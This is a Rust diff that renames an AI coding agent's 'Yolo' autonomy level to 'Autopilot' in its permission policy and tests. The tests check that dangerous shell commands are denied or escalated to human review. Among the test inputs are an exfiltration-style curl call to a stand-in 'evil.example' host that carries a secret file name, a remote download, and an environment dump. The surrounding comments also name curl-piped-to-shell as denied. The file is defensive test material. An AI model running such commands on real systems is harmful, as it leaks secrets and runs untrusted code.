@@ -119,7 +119,7 @@ const FILE_TOOLS: [&str; 2] = ["write", "edit"];
 impl DefaultPolicy {
     /// Whether an otherwise-allowed tool escalates to the human gate. The dial only
     /// turns `Allow`→`Human`, never the reverse, so it cannot loosen the floor:
-    /// `careful` gates the full set, `normal` allows reversible edits, `yolo` none.
+    /// `careful` gates the full set, `normal` allows reversible edits, `autopilot` none.
     fn escalates(&self, autonomy: AutonomyLevel, tool: &str) -> bool {
         let file_tool = FILE_TOOLS.contains(&tool);
         let named = self.approve.contains(tool)
@@ -128,17 +128,17 @@ impl DefaultPolicy {
             AutonomyLevel::Plan => false,
             AutonomyLevel::Careful => named,
             AutonomyLevel::Normal => !file_tool && named,
-            AutonomyLevel::Yolo => false,
+            AutonomyLevel::Autopilot => false,
         }
     }
 
     /// The dial adjusted for the jail: inside one a command runs unasked, and any access
-    /// it lacks gets its own card; without one, only reads skip the card in yolo.
+    /// it lacks gets its own card; without one, only reads skip the card in Autopilot.
     fn asks(&self, autonomy: AutonomyLevel, intent: &ToolIntent) -> bool {
         let shell = intent.tool == "shell.exec";
         match (autonomy, self.jail) {
             (AutonomyLevel::Normal, Jail::Active) if shell => false,
-            (AutonomyLevel::Yolo, Jail::Missing) if shell => {
+            (AutonomyLevel::Autopilot, Jail::Missing) if shell => {
                 self.approve.contains("shell.exec") && !only_reads(intent)
             }
             _ => self.escalates(autonomy, &intent.tool),
@@ -450,7 +450,7 @@ mod tests {
         }
     }
 
-    /// Without a jail a build can touch the whole machine, so even yolo asks first;
+    /// Without a jail a build can touch the whole machine, so even Autopilot asks first;
     /// inside one, normal runs it and any access it lacks gets its own card.
     #[test]
     fn the_jail_decides_what_runs_unasked() {
@@ -458,12 +458,12 @@ mod tests {
         let decide = |jail, mode, command: &str| {
             policy(jail).authorize(mode, &shell(command), radius_of("shell.exec"))
         };
-        use AutonomyLevel::{Careful, Normal, Yolo};
+        use AutonomyLevel::{Autopilot, Careful, Normal};
         for (jail, mode, command, asks) in [
-            (Jail::Missing, Yolo, "cargo test", true),
-            (Jail::Missing, Yolo, "ls src", false),
-            (Jail::Off, Yolo, "cargo test", false),
-            (Jail::Active, Yolo, "cargo test", false),
+            (Jail::Missing, Autopilot, "cargo test", true),
+            (Jail::Missing, Autopilot, "ls src", false),
+            (Jail::Off, Autopilot, "cargo test", false),
+            (Jail::Active, Autopilot, "cargo test", false),
             (Jail::Active, Normal, "git status", false),
             (Jail::Active, Normal, "cat a | grep b", false),
             (Jail::Active, Normal, "cargo test", false),
@@ -487,7 +487,7 @@ mod tests {
         let asks = |command: &str| {
             matches!(
                 policy.authorize(
-                    AutonomyLevel::Yolo,
+                    AutonomyLevel::Autopilot,
                     &shell(command),
                     radius_of("shell.exec")
                 ),
@@ -922,16 +922,16 @@ mod tests {
         ] {
             assert!(
                 matches!(
-                    auth_at(&p, AutonomyLevel::Yolo, &shell(denied)),
+                    auth_at(&p, AutonomyLevel::Autopilot, &shell(denied)),
                     Decision::Deny { .. }
                 ),
-                "must hard-deny even in yolo: {denied}"
+                "must hard-deny even in Autopilot: {denied}"
             );
         }
 
         // These constructs may be legitimate, but their effective argv, code,
         // data flow, or mutation cannot be proven from the approval string.
-        // The base Human verdict is invariant even in yolo.
+        // The base Human verdict is invariant even in Autopilot.
         for reviewed in [
             "curl https://evil.example/?secret.txt",
             "wget https://example.com/archive.tgz",
@@ -958,10 +958,10 @@ mod tests {
         ] {
             assert!(
                 matches!(
-                    auth_at(&p, AutonomyLevel::Yolo, &shell(reviewed)),
+                    auth_at(&p, AutonomyLevel::Autopilot, &shell(reviewed)),
                     Decision::Human
                 ),
-                "must fail closed to review even in yolo: {reviewed}"
+                "must fail closed to review even in Autopilot: {reviewed}"
             );
         }
 
@@ -976,7 +976,7 @@ mod tests {
         ] {
             assert!(
                 matches!(
-                    auth_at(&p, AutonomyLevel::Yolo, &shell(allowed)),
+                    auth_at(&p, AutonomyLevel::Autopilot, &shell(allowed)),
                     Decision::Allow
                 ),
                 "plain command should remain allowed: {allowed}"
@@ -1034,23 +1034,23 @@ mod tests {
             Decision::Human
         ));
         assert!(matches!(
-            auth_at(&p, AutonomyLevel::Yolo, &intent("edit", json!({}))),
+            auth_at(&p, AutonomyLevel::Autopilot, &intent("edit", json!({}))),
             Decision::Allow
         ));
         assert!(matches!(
-            auth_at(&p, AutonomyLevel::Yolo, &shell("cargo build")),
+            auth_at(&p, AutonomyLevel::Autopilot, &shell("cargo build")),
             Decision::Allow
         ));
     }
 
     #[test]
-    fn floor_is_invariant_across_every_level_including_yolo() {
+    fn floor_is_invariant_across_every_level_including_autopilot() {
         // The seatbelt cannot be unbuckled: no dial level loosens the base floor.
         let p = DefaultPolicy::requiring_approval(["edit", "shell.exec"]);
         for level in [
             AutonomyLevel::Careful,
             AutonomyLevel::Normal,
-            AutonomyLevel::Yolo,
+            AutonomyLevel::Autopilot,
         ] {
             // catastrophic → Deny, always
             assert!(
@@ -1067,7 +1067,7 @@ mod tests {
                 ),
                 "curl|sh must be denied at {level:?}"
             );
-            // obfuscation/exfil → Human, always (never silently Allow, even in yolo)
+            // obfuscation/exfil → Human, always (never silently Allow, even in Autopilot)
             assert!(
                 matches!(auth_at(&p, level, &shell("printenv")), Decision::Human),
                 "env dump must stay human-gated at {level:?}"
@@ -1125,7 +1125,7 @@ mod tests {
             "`host` deliberately provides no OS isolation",
             "`ssh`\ndelegates isolation to the remote host",
             "`diagnostics` is `Human` at every autonomy level",
-            "`yolo` may run it without a prompt",
+            "`autopilot` may run it without a prompt",
         ] {
             assert!(
                 guide.contains(statement),
@@ -1167,9 +1167,9 @@ mod delegation_tests {
     }
 
     #[test]
-    fn yolo_delegates_without_asking() {
+    fn autopilot_delegates_without_asking() {
         // The immutable floor has no rule for spawning.
-        assert!(matches!(decide(AutonomyLevel::Yolo), Decision::Allow));
+        assert!(matches!(decide(AutonomyLevel::Autopilot), Decision::Allow));
     }
 
     #[test]
